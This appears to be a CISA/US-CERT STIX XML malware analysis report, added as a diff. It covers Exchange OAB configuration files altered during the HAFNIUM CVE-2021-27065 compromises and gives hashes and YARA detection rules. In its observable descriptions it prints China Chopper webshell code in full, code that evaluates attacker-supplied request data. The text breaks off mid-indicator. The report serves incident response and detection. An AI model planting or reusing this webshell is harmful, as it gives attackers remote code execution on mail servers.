@@ -1,0 +1,844 @@
+<stix:STIX_Package 
+	xmlns:cyboxCommon="http://cybox.mitre.org/common-2"
+	xmlns:cybox="http://cybox.mitre.org/cybox-2"
+	xmlns:cyboxVocabs="http://cybox.mitre.org/default_vocabularies-2"
+	xmlns:FileObj="http://cybox.mitre.org/objects#FileObject-2"
+	xmlns:marking="http://data-marking.mitre.org/Marking-1"
+	xmlns:tlpMarking="http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1"
+	xmlns:TOUMarking="http://data-marking.mitre.org/extensions/MarkingStructure#Terms_Of_Use-1"
+	xmlns:maecBundle="http://maec.mitre.org/XMLSchema/maec-bundle-4"
+	xmlns:maecPackage="http://maec.mitre.org/XMLSchema/maec-package-2"
+	xmlns:maecVocabs="http://maec.mitre.org/default_vocabularies-1"
+	xmlns:incident="http://stix.mitre.org/Incident-1"
+	xmlns:indicator="http://stix.mitre.org/Indicator-2"
+	xmlns:ttp="http://stix.mitre.org/TTP-1"
+	xmlns:stixCommon="http://stix.mitre.org/common-1"
+	xmlns:stixVocabs="http://stix.mitre.org/default_vocabularies-1"
+	xmlns:stix-maec="http://stix.mitre.org/extensions/Malware#MAEC4.1-1"
+	xmlns:yaraTM="http://stix.mitre.org/extensions/TestMechanism#YARA-1"
+	xmlns:stix="http://stix.mitre.org/stix-1"
+	xmlns:NCCIC="http://www.us-cert.gov/"
+	xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+	xsi:schemaLocation="
+	http://cybox.mitre.org/common-2 http://cybox.mitre.org/XMLSchema/common/2.1/cybox_common.xsd
+	http://cybox.mitre.org/cybox-2 http://cybox.mitre.org/XMLSchema/core/2.1/cybox_core.xsd
+	http://cybox.mitre.org/default_vocabularies-2 http://cybox.mitre.org/XMLSchema/default_vocabularies/2.1/cybox_default_vocabularies.xsd
+	http://cybox.mitre.org/objects#FileObject-2 http://cybox.mitre.org/XMLSchema/objects/File/2.1/File_Object.xsd
+	http://data-marking.mitre.org/Marking-1 http://stix.mitre.org/XMLSchema/data_marking/1.1.1/data_marking.xsd
+	http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1 http://stix.mitre.org/XMLSchema/extensions/marking/tlp/1.1.1/tlp_marking.xsd
+	http://data-marking.mitre.org/extensions/MarkingStructure#Terms_Of_Use-1 http://stix.mitre.org/XMLSchema/extensions/marking/terms_of_use/1.0.1/terms_of_use_marking.xsd
+	http://maec.mitre.org/XMLSchema/maec-bundle-4 http://maec.mitre.org/language/version4.1/maec_bundle_schema.xsd
+	http://maec.mitre.org/XMLSchema/maec-package-2 http://maec.mitre.org/language/version4.1/maec_package_schema.xsd
+	http://maec.mitre.org/default_vocabularies-1 http://maec.mitre.org/language/version4.1/maec_default_vocabularies.xsd
+	http://stix.mitre.org/Incident-1 http://stix.mitre.org/XMLSchema/incident/1.1.1/incident.xsd
+	http://stix.mitre.org/Indicator-2 http://stix.mitre.org/XMLSchema/indicator/2.1.1/indicator.xsd
+	http://stix.mitre.org/TTP-1 http://stix.mitre.org/XMLSchema/ttp/1.1.1/ttp.xsd
+	http://stix.mitre.org/common-1 http://stix.mitre.org/XMLSchema/common/1.1.1/stix_common.xsd
+	http://stix.mitre.org/default_vocabularies-1 http://stix.mitre.org/XMLSchema/default_vocabularies/1.1.1/stix_default_vocabularies.xsd
+	http://stix.mitre.org/extensions/Malware#MAEC4.1-1 http://stix.mitre.org/XMLSchema/extensions/malware/maec_4.1/1.0.1/maec_4.1_malware.xsd
+	http://stix.mitre.org/extensions/TestMechanism#YARA-1 http://stix.mitre.org/XMLSchema/extensions/test_mechanism/yara/1.1.1/yara_test_mechanism.xsd
+	http://stix.mitre.org/stix-1 http://stix.mitre.org/XMLSchema/core/1.1.1/stix_core.xsd" id="NCCIC:Package-2a812fab-1fa0-4679-b887-19cb306f3bd9" version="1.1.1" timestamp="2021-03-19T09:24:35-04:00">
+    <stix:STIX_Header>
+        <stix:Title>MAR-10329301.r1.v1</stix:Title>
+        <stix:Package_Intent>Malware Characterization</stix:Package_Intent>
+        <stix:Handling>
+            <marking:Marking>
+                <marking:Controlled_Structure>//node() | //@*</marking:Controlled_Structure>
+                <marking:Marking_Structure xsi:type='tlpMarking:TLPMarkingStructureType' color="WHITE"/>
+                <marking:Marking_Structure xsi:type='TOUMarking:TermsOfUseMarkingStructureType'>
+                    <TOUMarking:Terms_Of_Use>This document is marked TLP:WHITE--Disclosure is not limited. Sources may use TLP:WHITE when information carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject to standard copyright rules, TLP:WHITE information may be distributed without restriction. For more information on the Traffic Light Protocol (TLP), see http://www.us-cert.gov/tlp.</TOUMarking:Terms_Of_Use>
+                </marking:Marking_Structure>
+            </marking:Marking>
+        </stix:Handling>
+        <stix:Information_Source>
+            <stixCommon:Identity>
+                <stixCommon:Name>US-CERT</stixCommon:Name>
+            </stixCommon:Identity>
+            <stixCommon:Time>
+                <cyboxCommon:Produced_Time>2021-03-19T09:24:35-04:00</cyboxCommon:Produced_Time>
+            </stixCommon:Time>
+            <stixCommon:Tools>
+                <cyboxCommon:Tool>
+                    <cyboxCommon:Name>BMachine</cyboxCommon:Name>
+                    <cyboxCommon:Description>134</cyboxCommon:Description>
+                    <cyboxCommon:Version>7.1.0</cyboxCommon:Version>
+                </cyboxCommon:Tool>
+            </stixCommon:Tools>
+        </stix:Information_Source>
+    </stix:STIX_Header>
+    <stix:Observables cybox_major_version="2" cybox_minor_version="1" cybox_update_version="0">
+        <cybox:Observable id="NCCIC:Observable-4f69344b-289b-4f36-b921-e1f6861bc9b8">
+            <cybox:Description><![CDATA[This file is an OAB configuration file. Analysis indicates this file contains log data collected from an OAB configured on a compromised Microsoft Exchange Server. The Exchange OAB VD is utilized to access Microsoft Exchange address lists. For this file, the OAB ExternalUrl parameter has been modified by a remote operator to include a "China Chopper" webshell which is likely an attempt to gain unauthorized access for dynamic remote code execution against a targeted Microsoft Exchange Server. In this file, the OAB ExternalUrl parameter was configured to accept JavaScript code which will directly be executed on the target system. The modification of the ExternalUrl parameter suggests the operator can dynamically submit queries to this Exchange OAB VD containing JavaScript code that will be executed on the target system.
+
+In this file, the ExternalUrl designation that normally specifies the Uniform Resource Locator (URL) used to connect to the VD from outside the firewall has been replaced with the following code:
+
+--Begin webshell--
+http[:]//f/<script language="JScript" runat="server">function Page_Load(){eval(System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(Request.Item["22cddb421b13c90130b2b2bddedeb360"])),"unsafe");}</script>
+--End webshell--
+
+The code within the file decodes and executes data using the JavaScript “eval” function. The requested encoded data was not available for analysis.
+
+Displayed are the contents of the configuration:
+
+--Begin configuration--
+Server                          : [REDACTED]
+WhenChanged                     : 3/5/2021 7:55:08 AM
+InternalUrl                     : hxxps[:]//REDACTED].local/OAB
+ExternalUrl                     : hxxp[:]//f/<script language="JScript" runat="server">function Page_Load(){eval(System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(Request.Item["22cddb421b13c90130b2b2bddedeb360"])),"unsafe");}</script>
+Identity                        : [REDACTED\OAB (Default Web Site)
+PollInterval                    : 480
+Name                            : OAB (Default Web Site)
+AdminDisplayVersion             : Version 15.2 (Build 659.4)
+OfflineAddressBooks             : 
+RequireSSL                      : True
+BasicAuthentication             : False
+WindowsAuthentication           : True
+OAuthAuthentication             : False
+MetabasePath                    : IIS[:]//[REDACTED].local/W3SVC/1/ROOT/OAB
+Path                            : E:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\OAB
+ExtendedProtectionTokenChecking : None
+ExtendedProtectionFlags         : 
+ExtendedProtectionSPNList       : 
+InternalAuthenticationMethods   : WindowsIntegrated
+ExternalAuthenticationMethods   : WindowsIntegrated
+AdminDisplayName                : 
+ExchangeVersion                 : 0.10 (14.0.100.0)
+DistinguishedName               : CN=OAB (Default Web Site),CN=HTTP,CN=Protocols,CN=[REDACTED],CN=Servers,CN=Exchange Administrative Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=[REDACTED],DC=local
+Guid                            : 2604a1e4-17af-4f27-9a43-0c9f877ab1fa
+ObjectCategory                  : [REDACTED].local/Configuration/Schema/ms-Exch-OAB-Virtual-Directory
+ObjectClass                     : top
+                                  msExchVirtualDirectory
+                                  msExchOABVirtualDirectory
+WhenCreated                     : 3/4/2021 11:29:50 AM
+WhenChangedUTC                  : 3/5/2021 12:55:08 PM
+WhenCreatedUTC                  : 3/4/2021 4:29:50 PM
+OrganizationId                  : 
+Id                              : [REDACTED]\OAB (Default Web Site)
+OriginatingServer               : [REDACTED]-dc1.[REDACTED].local
+IsValid                         : True
+--End configuration--]]></cybox:Description>
+            <cybox:Object id="NCCIC:File-c4b8d79b-4788-427c-96d4-8f6acaf397d4">
+                <cybox:Properties xsi:type="FileObj:FileObjectType">
+                    <FileObj:File_Name>web.config.aspx</FileObj:File_Name>
+                    <FileObj:Size_In_Bytes>2241</FileObj:Size_In_Bytes>
+                    <FileObj:File_Format>HTML document, ASCII text, with CRLF line terminators</FileObj:File_Format>
+                    <FileObj:Hashes>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>742b340f8739e73d9347d68e7ffc1590</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>fc5e612238d4217b10ba2c6701f487d1346f8338</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>5ac7dec465b3a532d401afe83f40d336ffc599643501a40d95aa886c436bfc0f</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA512</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>9893f5c6e204b8188bf2e6670d590abdd0f7bba403d4b641f87ee59d037ee0c692d591f3eba10bd6c1142003a246964036465b1f813eaa1d5fc8aaf75628994c</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>24:kNrde9gvxL+rJTh91QGBORNXd56j0SzMa1VMr6j71idfhnohdxpTYFs2E4ONF0qe:kNrdeEC1BfGw0xM5QZohdf6q4ONF0qe</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                    </FileObj:Hashes>
+                    <FileObj:Peak_Entropy>4.700805</FileObj:Peak_Entropy>
+                </cybox:Properties>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="NCCIC:Observable-c3f07064-0c78-461a-b549-9898fcad5276">
+            <cybox:Description><![CDATA[This file is an OAB configuration file. Analysis indicates this file contains log data collected from an OAB configured on a compromised system. The Exchange OAB VD is utilized to access Microsoft Exchange address lists. For this file, the OAB ExternalUrl parameter has been modified by a remote operator to include a "China Chopper" webshell, which is likely an attempt to gain unauthorized access for dynamic remote code execution against a targeted Microsoft Exchange Server.
+
+In this file, the ExternalUrl designation that normally specifies the URL used to connect to the VD from outside the firewall has been replaced with the following code: 
+
+--Begin webshell--
+hxxp[:]//f/<script language="JScript" runat="server">function Page_Load(){eval(Request["[REDACTED]"],"unsafe");}</script>
+--End webshell--
+
+he hard-coded key used for authentication was redacted from the code above. 
+
+This file contains the following configuration data (sensitive data was redacted): 
+
+--Begin configuration--
+Name                            : OAB (Default Web Site)
+PollInterval                    : 480
+OfflineAddressBooks             : 
+RequireSSL                      : True
+BasicAuthentication             : False
+WindowsAuthentication           : True
+OAuthAuthentication             : False
+MetabasePath                    : IIS[:]//[REDACTED].local/W3SVC/1/ROOT/OAB
+Path                            : E:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\OAB
+ExtendedProtectionTokenChecking : None
+ExtendedProtectionFlags         : 
+ExtendedProtectionSPNList       : 
+AdminDisplayVersion             : Version 15.2 (Build 659.4)
+Server                          : [REDACTED]
+InternalUrl                     : hxxps://[REDACTED].local/OAB
+InternalAuthenticationMethods   : WindowsIntegrated
+ExternalUrl                     : hxxp[:]//f/<script language="JScript" runat="server">function Page_Load(){eval(Request["[REDACTED"],"unsafe");}</script>
+ExternalAuthenticationMethods   : WindowsIntegrated
+AdminDisplayName                : 
+ExchangeVersion                 : 0.10 (14.0.100.0)
+DistinguishedName               : CN=OAB (Default Web Site),CN=HTTP,CN=Protocols,CN=[REDACTED],CN=Servers,CN=Exchange Administrative Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=[REDACTED],DC=local
+Identity                        : MCKEX2019\OAB (Default Web Site)
+Guid                            : 2ffb2ea7-36b9-4ed4-9ea9-3bfa75d67947
+ObjectCategory                  : [REDACTED].local/Configuration/Schema/ms-Exch-OAB-Virtual-Directory
+ObjectClass                     : top
+                                  msExchVirtualDirectory
+                                  msExchOABVirtualDirectory
+WhenChanged                     : 3/4/2021 11:29:42 AM
+WhenCreated                     : 3/3/2021 10:35:01 AM
+WhenChangedUTC                  : 3/4/2021 4:29:42 PM
+WhenCreatedUTC                  : 3/3/2021 3:35:01 PM
+OrganizationId                  : 
+Id                              : MCKEX2019\OAB (Default Web Site)
+OriginatingServer               : [REDACTED]-dc1.[REDACTED].local
+IsValid                         : True
+--End configuration--]]></cybox:Description>
+            <cybox:Object id="NCCIC:File-978ebc14-37eb-437c-a89d-a219e51eddb7">
+                <cybox:Properties xsi:type="FileObj:FileObjectType">
+                    <FileObj:File_Name>uHSPTWMG.aspx</FileObj:File_Name>
+                    <FileObj:Size_In_Bytes>2226</FileObj:Size_In_Bytes>
+                    <FileObj:File_Format>ASCII text, with CRLF line terminators</FileObj:File_Format>
+                    <FileObj:Hashes>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>f04aa369ceee2d1388f9453d0d9758df</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>888d1a0e10222a80c8076728d16eb10072b1473b</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>c7e1b386b472a26a36632f4ccc25e37458546b9c864b7ef0ec5ebece5e8cc704</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA512</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>4dd200a585fe93f2f8f102fd0359c4290d4b516ce5ec6a8b304ded61bf3a332d5c81272cada303109a366c42fa38956387e33b7309fcbf3ef6dbf7a27cf0a10e</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>24:kNrdjgvxL+rJTh91QGBORNmfB68U6Q68UB1idfhnohdxyAFs2E4ONF0qf9H2:kNrdaC1BfGt67PQZohdsWq4ONF0qk</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                    </FileObj:Hashes>
+                    <FileObj:Peak_Entropy>4.526671</FileObj:Peak_Entropy>
+                </cybox:Properties>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="NCCIC:Observable-bebd1b9a-b7b0-46d3-97a1-d89363bb4d6d">
+            <cybox:Description><![CDATA[This is file is an OAB configuration file. The configuration contains a key in the "ExternalUrl" field used for authentication. No webshell was observed in this configuration at the time of analysis.
+
+This file contains the following configuration data (sensitive data was redacted): 
+
+--Begin configuration--
+Name                            : OAB (Default Web Site)
+PollInterval                    : 480
+OfflineAddressBooks             : 
+RequireSSL                      : True
+BasicAuthentication             : False
+WindowsAuthentication           : True
+OAuthAuthentication             : True
+MetabasePath                    : IIS[:]//[REDACTED].local/W3SVC/1/ROOT/OAB
+Path                            : E:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\OAB
+ExtendedProtectionTokenChecking : None
+ExtendedProtectionFlags         : 
+ExtendedProtectionSPNList       : 
+AdminDisplayVersion             : Version 15.2 (Build 659.4)
+Server                          : MCKEX2019
+InternalUrl                     : hxxps[:]//mail.[REDACTED].org/OAB
+InternalAuthenticationMethods   : OAuth
+                                  WindowsIntegrated
+ExternalUrl                     : hxxp[:]//f/[REDACTED]
+ExternalAuthenticationMethods   : OAuth
+                                  WindowsIntegrated
+AdminDisplayName                : 
+ExchangeVersion                 : 0.10 (14.0.100.0)
+DistinguishedName               : CN=OAB (Default Web Site),CN=HTTP,CN=Protocols,CN=[REDACTED],CN=Servers,CN=Exchange Administrative Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=[REDACTED],DC=local
+Identity                        : [REDACTED]\OAB (Default Web Site)
+Guid                            : 5ca610e7-d5d9-4eaa-8625-76ec5e0ec867
+ObjectCategory                  : [REDACTED].local/Configuration/Schema/ms-Exch-OAB-Virtual-Directory
+ObjectClass                     : top
+                                  msExchVirtualDirectory
+                                  msExchOABVirtualDirectory
+WhenChanged                     : 2/27/2021 6:47:53 PM
+WhenCreated                     : 6/16/2020 4:57:54 PM
+WhenChangedUTC                  : 2/27/2021 11:47:53 PM
+WhenCreatedUTC                  : 6/16/2020 8:57:54 PM
+OrganizationId                  : 
+Id                              : [REDACTED]\OAB (Default Web Site)
+OriginatingServer               : [REDACTED]-dc1.[REDACTED].local
+IsValid                         : True
+--End configuration--]]></cybox:Description>
+            <cybox:Object id="NCCIC:File-e03dd70c-4599-4ed6-8b92-91a4e8a96570">
+                <cybox:Properties xsi:type="FileObj:FileObjectType">
+                    <FileObj:File_Name>supp0rt.aspx</FileObj:File_Name>
+                    <FileObj:Size_In_Bytes>2328</FileObj:Size_In_Bytes>
+                    <FileObj:File_Format>HTML document, ASCII text, with CRLF line terminators</FileObj:File_Format>
+                    <FileObj:Hashes>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>b5aff5be558e41243225a3e2480fc8dc</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>4bc72b82af2f455eb69e582793593db8fb03c7da</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>5e09ea8b70a386f0812a8cafb94e2d2365849ce67fda42377389f18e56d860d0</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA512</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>68f92197cc11748e88aa18012bdfa910e30bc2bd605ad6fe5291f3f87b5cd00f65d201b41945d9dea392f526eb5736ef5fff2d7628b7859665d01743d4eadb58</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>48:1vEsFkLavMfmrdeEC1z95QZohdoTq4ONF0qt:1vEsWLgEydeb7zNCqt</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                    </FileObj:Hashes>
+                    <FileObj:Peak_Entropy>4.763355</FileObj:Peak_Entropy>
+                </cybox:Properties>
+            </cybox:Object>
+        </cybox:Observable>
+    </stix:Observables>
+    <stix:Indicators>
+        <stix:Indicator id="NCCIC:indicator-631964e8-cc64-4c0c-9188-f9878f2d9d58" timestamp="2021-03-19T13:33:24.458039+00:00" xsi:type='indicator:IndicatorType'>
+            <indicator:Title>CISA_Consolidated.yara: CISA_10328929_02</indicator:Title>
+            <indicator:Type>Malware Artifacts</indicator:Type>
+            <indicator:Observable id="NCCIC:Observable-54437072-2955-4623-a032-245465696da1">
+                <cybox:Object id="NCCIC:File-4c471eb8-2fa8-4223-8b06-57b32a51b688">
+                    <cybox:Properties xsi:type="FileObj:FileObjectType">
+                        <FileObj:Hashes>
+                            <cyboxCommon:Hash>
+                                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                                <cyboxCommon:Simple_Hash_Value condition="Equals">742b340f8739e73d9347d68e7ffc1590</cyboxCommon:Simple_Hash_Value>
+                            </cyboxCommon:Hash>
+                            <cyboxCommon:Hash>
+                                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                                <cyboxCommon:Simple_Hash_Value condition="Equals">fc5e612238d4217b10ba2c6701f487d1346f8338</cyboxCommon:Simple_Hash_Value>
+                            </cyboxCommon:Hash>
+                            <cyboxCommon:Hash>
+                                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type>
+                                <cyboxCommon:Simple_Hash_Value condition="Equals">5ac7dec465b3a532d401afe83f40d336ffc599643501a40d95aa886c436bfc0f</cyboxCommon:Simple_Hash_Value>
+                            </cyboxCommon:Hash>
+                        </FileObj:Hashes>
+                    </cybox:Properties>
+                </cybox:Object>
+            </indicator:Observable>
+            <indicator:Indicated_TTP>
+                <stixCommon:TTP idref="NCCIC:ttp-0c5c2e46-7b82-40e3-bdcb-ccb29c1563ea" xsi:type='ttp:TTPType'/>
+            </indicator:Indicated_TTP>
+            <indicator:Indicated_TTP>
+                <stixCommon:TTP idref="NCCIC:ttp-59f7d8e2-3276-4df8-9a95-3870bd565d60" xsi:type='ttp:TTPType'/>
+            </indicator:Indicated_TTP>
+            <indicator:Indicated_TTP>
+                <stixCommon:TTP idref="NCCIC:ttp-32c0eac2-d84e-4aa7-98fd-8204015cfa3c" xsi:type='ttp:TTPType'/>
+            </indicator:Indicated_TTP>
+            <indicator:Indicated_TTP>
+                <stixCommon:TTP idref="NCCIC:ttp-f7b731cd-3563-448e-ace7-9c62fa99f48e" xsi:type='ttp:TTPType'/>
+            </indicator:Indicated_TTP>
+            <indicator:Test_Mechanisms>
+                <indicator:Test_Mechanism  xsi:type="yaraTM:YaraTestMechanismType">
+                    <indicator:Producer>
+                        <stixCommon:Identity>
+                            <stixCommon:Name>NCCIC</stixCommon:Name>
+                        </stixCommon:Identity>
+                        <stixCommon:References>
+                            <stixCommon:Reference>http://plusvic.github.io/yara/</stixCommon:Reference>
+                        </stixCommon:References>
+                    </indicator:Producer>
+                    <yaraTM:Rule><![CDATA[rule CISA_10328929_02 : trojan webshell exploit CVE_2021_27065
+{
+	meta:
+		Author = "CISA Code & Media Analysis"
+		Incident = "10328929"
+		Date = "2021-03-17"
+		Last_Modified = "20210317_2200"
+		Actor = "n/a"
+		Category = "Trojan WebShell Exploit CVE-2021-27065"
+		Family = "HAFNIUM"
+		Description = "Detects CVE-2021-27065 Exchange OAB VD MOD"
+		MD5_1 = "ab3963337cf24dc2ade6406f11901e1f"
+		SHA256_1 = "c8a7b5ffcf23c7a334bb093dda19635ec06ca81f6196325bb2d811716c90f3c5"
+	strings:
+		$s0 = { 4F 66 66 6C 69 6E 65 41 64 64 72 65 73 73 42 6F 6F 6B 73 }
+		$s1 = { 3A 20 68 74 74 70 3A 2F 2F [1] 2F }
+		$s2 = { 45 78 74 65 72 6E 61 6C 55 72 6C 20 20 20 20 }
+	condition:
+		$s0 and $s1 and $s2
+}]]></yaraTM:Rule>
+                </indicator:Test_Mechanism>
+            </indicator:Test_Mechanisms>
+            <indicator:Producer>
+                <stixCommon:Identity>
+                    <stixCommon:Name>NCCIC</stixCommon:Name>
+                </stixCommon:Identity>
+                <stixCommon:Time>
+                    <cyboxCommon:Produced_Time>2021-03-19T13:33:24+00:00</cyboxCommon:Produced_Time>
+                </stixCommon:Time>
+            </indicator:Producer>
+        </stix:Indicator>
+        <stix:Indicator id="NCCIC:indicator-1c5f8a0f-adca-42d3-ad6c-d1910580a5d7" timestamp="2021-03-19T13:33:24.550335+00:00" xsi:type='indicator:IndicatorType'>
+            <indicator:Title>CISA_Consolidated.yara: CISA_10328929_02</indicator:Title>
+            <indicator:Type>Malware Artifacts</indicator:Type>
+            <indicator:Observable id="NCCIC:Observable-00dbc0fe-49cc-4a24-aece-3ebca232f7b7">
+                <cybox:Object id="NCCIC:File-00503000-92c4-4833-a2c6-e26f2b78f2b6">
+                    <cybox:Properties xsi:type="FileObj:FileObjectType">
+                        <FileObj:Hashes>
+                            <cyboxCommon:Hash>
+                                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                                <cyboxCommon:Simple_Hash_Value condition="Equals">f04aa369ceee2d1388f9453d0d9758df</cyboxCommon:Simple_Hash_Value>
+                            </cyboxCommon:Hash>
+                            <cyboxCommon:Hash>
+                                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                                <cyboxCommon:Simple_Hash_Value condition="Equals">888d1a0e10222a80c8076728d16eb10072b1473b</cyboxCommon:Simple_Hash_Value>
+                            </cyboxCommon:Hash>
+                            <cyboxCommon:Hash>
+                                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type>
+                                <cyboxCommon:Simple_Hash_Value condition="Equals">c7e1b386b472a26a36632f4ccc25e37458546b9c864b7ef0ec5ebece5e8cc704</cyboxCommon:Simple_Hash_Value>
+                            </cyboxCommon:Hash>
+                        </FileObj:Hashes>
+                    </cybox:Properties>
+                </cybox:Object>
+            </indicator:Observable>
+            <indicator:Indicated_TTP>
+                <stixCommon:TTP idref="NCCIC:ttp-0fe4771d-2ac5-4651-800e-9767c5a84e09" xsi:type='ttp:TTPType'/>
+            </indicator:Indicated_TTP>
+            <indicator:Indicated_TTP>
+                <stixCommon:TTP idref="NCCIC:ttp-59f7d8e2-3276-4df8-9a95-3870bd565d60" xsi:type='ttp:TTPType'/>
+            </indicator:Indicated_TTP>
+            <indicator:Test_Mechanisms>
+                <indicator:Test_Mechanism  xsi:type="yaraTM:YaraTestMechanismType">
+                    <indicator:Producer>
+                        <stixCommon:Identity>
+                            <stixCommon:Name>NCCIC</stixCommon:Name>
+                        </stixCommon:Identity>
+                        <stixCommon:References>
+                            <stixCommon:Reference>http://plusvic.github.io/yara/</stixCommon:Reference>
+                        </stixCommon:References>
+                    </indicator:Producer>
+                    <yaraTM:Rule><![CDATA[rule CISA_10328929_02 : trojan webshell exploit CVE_2021_27065
+{
+	meta:
+		Author = "CISA Code & Media Analysis"
+		Incident = "10328929"
+		Date = "2021-03-17"
+		Last_Modified = "20210317_2200"
+		Actor = "n/a"
+		Category = "Trojan WebShell Exploit CVE-2021-27065"
+		Family = "HAFNIUM"
+		Description = "Detects CVE-2021-27065 Exchange OAB VD MOD"
+		MD5_1 = "ab3963337cf24dc2ade6406f11901e1f"
+		SHA256_1 = "c8a7b5ffcf23c7a334bb093dda19635ec06ca81f6196325bb2d811716c90f3c5"
+	strings:
+		$s0 = { 4F 66 66 6C 69 6E 65 41 64 64 72 65 73 73 42 6F 6F 6B 73 }
+		$s1 = { 3A 20 68 74 74 70 3A 2F 2F [1] 2F }
+		$s2 = { 45 78 74 65 72 6E 61 6C 55 72 6C 20 20 20 20 }
+	condition:
+		$s0 and $s1 and $s2
+}]]></yaraTM:Rule>
+                </indicator:Test_Mechanism>
+            </indicator:Test_Mechanisms>
+            <indicator:Producer>
+                <stixCommon:Identity>
+                    <stixCommon:Name>NCCIC</stixCommon:Name>
+                </stixCommon:Identity>
+                <stixCommon:Time>
+                    <cyboxCommon:Produced_Time>2021-03-19T13:33:24+00:00</cyboxCommon:Produced_Time>
+                </stixCommon:Time>
+            </indicator:Producer>
+        </stix:Indicator>
+        <stix:Indicator id="NCCIC:indicator-a77e06e1-bbfc-4540-9b99-e73656768ded" timestamp="2021-03-19T13:33:24.637413+00:00" xsi:type='indicator:IndicatorType'>
